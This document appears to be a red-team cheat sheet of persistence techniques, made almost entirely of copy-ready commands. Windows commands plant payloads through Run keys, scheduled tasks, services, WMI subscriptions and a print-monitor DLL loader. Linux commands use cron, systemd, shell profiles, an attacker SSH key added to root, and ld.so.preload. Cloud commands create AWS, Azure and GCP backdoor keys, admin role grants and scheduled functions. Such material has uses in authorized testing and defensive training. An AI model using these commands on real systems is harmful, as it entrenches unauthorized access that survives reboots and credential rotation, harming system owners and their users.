---
title: Persistence
date: 2026-01-22
background: bg-[#9A3412]
icon: flag.svg
tags:
  - persistence
  - red teaming
  - malware
categories:
  - Tactics, Techniques, and Procedures
intro:   Reference cheat sheet for persistence techniques across Windows, Linux, Active Directory, and cloud environments. Focused on mechanisms that survive reboot, logoff, and credential rotation.
plugins:
  - copyCode
---

## Windows Persistence

### Registry Run keys 

Common Key locations are
```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

To persist 
```powershell {.wrap}
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d C:\temp\payload.exe
```

### Scheduled Tasks
User-level tasks
```cmd {.wrap}
schtasks /create /sc onlogon /tn updater /tr C:\temp\payload.exe
```

System-level tasks
```cmd {.wrap}
schtasks /create /sc onstart /ru SYSTEM /tn updater /tr C:\temp\payload.exe
```

### Services
Create and start the service
```cmd
sc create updater binPath= "C:\temp\payload.exe" start= auto
sc start updater
```

### Startup Folder
Copy payload into User startup folder:
```cmd {.wrap}
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```
### WMI Event Subscription {.col-span-2}
**Fileless Technique**
```powershell
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
-Arguments @{Name="Updater";EventNamespace="root\cimv2";QueryLanguage="WQL";
Query="SELECT * FROM Win32_LogonSession"}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
-Arguments @{Name="Updater";CommandLineTemplate="powershell -enc <PAYLOAD>"}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
-Arguments @{Filter=$filter;Consumer=$consumer}
```

### Add Monitor
**C2 must be a DLL.**

Put the dll in the `%systemroot%`

Compile and execute `monitor.cpp` within the environment as well

```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```
_Code Credit to ired.team_
See:[ired.team](https://www.ired.team/offensive-security/persistence/t1013-addmonitor)
See:[MS Documentation AddMonitor](https://learn.microsoft.com/en-us/windows/win32/printdocs/addmonitor?redirectedfrom=MSDN)

## Linux Persistence

### Cron Jobs
Create a User cron entry to run file every 5 minutes
```bash {.wrap}
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/payload.sh") | crontab -
```

Create a Root cron entry 
```bash
echo "* * * * * root /tmp/payload.sh" > /etc/cron.d/updater
```

change permissions to run
```bash
chmod 644 /etc/cron.d/updater
```


### Systemd Service {.row-span-2}

Create a Service File (Root)
```bash
cat <<EOF > /etc/systemd/system/updater.service
[Unit]
Description=System Updater

[Service]
ExecStart=/tmp/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF
```

Enable and Start 
```bash
systemctl daemon-reload
systemctl enable updater
systemctl start updater
```

Create a Service File (User)
```bash
mkdir -p ~/.config/systemd/user

cat <<EOF > ~/.config/systemd/user/updater.service
[Unit]
Description=User Updater

[Service]
ExecStart=/tmp/payload
Restart=always

[Install]
WantedBy=default.target
EOF
```

Enable and Start
```bash
systemctl --user daemon-reload
systemctl --user enable updater
systemctl --user start updater
```

### Bash/Shell Profile Startup

Append to `.bashrc`
```bash
echo "/tmp/payload &" >> ~/.bashrc
```

Append to `.bash_profile`
```bash
echo "/tmp/payload &" >> ~/.bash_profile
```

Global
```bash
echo "/tmp/payload &" >> /etc/profile
```

### SSH Auth Keys
**NOT OPSEC SAFE**
Add Attacker Key to user

```bash {.wrap}
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

Add to auth keys to Root
```bash
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```
### LD_PRELOAD
Force-load a malicious shared object into processes

Create the object
```bash
gcc -shared -fPIC evil.c -o /tmp/evil.so
```

```bash
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

## AWS Persistence

### IAM Access Key

Create a new access key
```bash
aws iam create-access-key --user-name compromised-user
```

Exfiltrate and Store

### IAM Policy 
Attach admin policy
```bash {.wrap}
aws iam attach-user-policy  --user-name compromised-user  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Inline policy backdoor
```bash {.wrap}
aws iam put-user-policy --user-name compromised-user --policy-name updater  --policy-document file://policy.json
```

### IAM Role Trust Policy
Modify trust relationship
```bash {.wrap}
aws iam update-assume-role-policy --role-name AdminRole --policy-document file://trust.json
```

### Lambda
Create Lambda
```bash {.wrap}
aws lambda create-function --function-name updater  --runtime python3.9  --handler handler.lambda_handler   --role arn:aws:iam::<acct>:role/AdminRole  --zip-file fileb://payload.zip
```

### CloudWatch Event Rules
Create Rule
```bash {.wrap}
aws events put-rule --schedule-expression "rate(5 minutes)"  --name updater
```

Attach to target
```bash {.wrap}
aws events put-targets --rule updater --targets file://targets.json
```

### EC2 User Data
Modify User Data
```bash {.wrap}
aws ec2 modify-instance-attribute --instance-id i-XXXX --user-data file://userdata.sh
```

## Azure Persistence

### Azure AD App Registration
Create an App
```bash
az ad app create --display-name updater
```

Add Secret
```bash
az ad app credential reset --id <APP_ID>
```

Grant Permissions
```bash {.wrap}
az ad app permission add --id <APP_ID> --api 00000003-0000-0000-c000-000000000000 --api-permissions <perm>=Role
```

### Service Principal Persistence
Create service principal
```bash
az ad sp create --id <APP_ID>
```

Assign the role
```bash {.wrap}
az role assignment create --assignee <SP_ID> --role Owner --scope /subscriptions/<SUB_ID>
```

### Automation Accounts
Create a runbook
```bash {.wrap}
az automation runbook create --automation-account-name auto --resource-group rg  --name updater  --type PowerShell
```
Schedule execution
```bash
az automation schedule create --name updater-sched
```

### Managed Identiy Abuse
Assign an identity
```bash
az vm identity assign --name vm01 --resource-group rg
```

Grant it privileges
```bash {.wrap}
az role assignment create --assignee <IDENTITY_ID> --role Contributor --scope /subscriptions/<SUB_ID>
```
## GCP Persistence

### Service Account Key Backdoor
Create the key
```bash {.wrap}
gcloud iam service-accounts keys create key.json  --iam-account svc@project.iam.gserviceaccount.com
```

### IAM Role Binding
Grant an account persistent access
```bash {.wrap}
gcloud projects add-iam-policy-binding project-id  --member serviceAccount:svc@project.iam.gserviceaccount.com  --role roles/owner
```

### Cloud Functions 
Create a new funciton
```bash {.wrap}
gcloud functions deploy updater --runtime python39 --trigger-http  --allow-unauthenticated
```

### Cloud Scheduler
```bash {.wrap}
gcloud scheduler jobs create pubsub updater --schedule "*/5 * * * *"  --topic updater-topic
```




